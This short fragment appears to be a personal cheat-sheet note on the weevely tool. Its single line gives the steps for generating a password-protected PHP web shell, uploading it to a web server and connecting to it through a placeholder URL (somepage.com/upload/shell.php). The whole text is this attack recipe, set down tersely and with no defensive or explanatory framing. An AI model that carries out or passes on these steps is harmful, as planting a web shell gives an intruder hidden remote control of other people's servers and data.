weevely - generating reverses shell, generate 122345 shell.php, then http://somepage.com/upload/shell.php 122345

